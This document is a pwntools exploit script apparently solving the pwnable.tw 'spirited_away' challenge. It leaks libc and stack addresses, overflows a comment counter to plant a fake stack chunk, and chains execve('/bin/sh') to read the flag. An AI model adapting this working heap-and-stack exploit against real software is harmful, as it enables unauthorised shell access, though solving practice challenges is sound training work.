from pwn import *
def sname(name):
	p.readuntil("\nPlease enter your name: ")
	p.send(name)
def sage(age):
	p.sendlineafter("Please enter your age: ",str(age))
def sr(reason):
	p.sendafter("Why did you came to see this movie? ",reason)
def sc(comment):
	p.sendlineafter("Please enter your comment: ",comment)
def raw(reason='nier',name='nier',age=1,comment="nier"):
	sname(name)
	sage(age)
	sr(reason)
	sc(comment)
def sall(reason='nier',name='nier',age=1,comment="nier"):
	sname(name)
	sage(age)
	sr(reason)
	sc(comment)
	p.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
def sall_10(reason='nier',name='nier',age=1,comment="nier"):

	sage(age)
	sr(reason)

	p.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
#p=process("./spirited_away",env={"LD_PRELOAD":'./libc'})
p=remote("chall.pwnable.tw",10204)
#context.log_level='debug'
libc=ELF("./libc")

raw("A"*0x18)
p.readuntil("A"*0x18)
libc.address = u32(p.recv(4))-libc.sym['_IO_file_sync']-7
p.recvuntil("comment? <y/n>: ")
p.send("y")


base=libc.address

raw("A"*56)
p.readuntil('A'*56)
stack=u32(p.read(4))
p.sendlineafter("<y/n>: ","y")

log.warning(hex(base))
log.warning(hex(stack))
for x in range(8):
	sall()

for x in range(90):
	sall_10()
for x in range(4):
	sall()


sname("yy")
sage(1)
sr(p32(0x41)*20)
sc("A"*0x50+p32(1)+p32(0xffffcff8-0xffffd048+stack-0x18))
p.sendlineafter("<y/n>: ","y")
#libc=ELF("./spirited_away").libc

libc.address=base
sname("/bin/sh".ljust(4*18,'\x00')+p32(0xdeadbeef)+p32(libc.symbols['execve'])+p32(0xdeadbeef)+p32(0xffffcff8-0xffffd048+stack-0x18)+p32(0)+p32(0))
sage(1)
sr("no")
sc("no")
#gdb.attach(p,'b *0x8048891')
p.sendlineafter("<y/n>: ","n")
p.sendline("cat /home/spirited_away/flag")
p.interactive("nier>>")
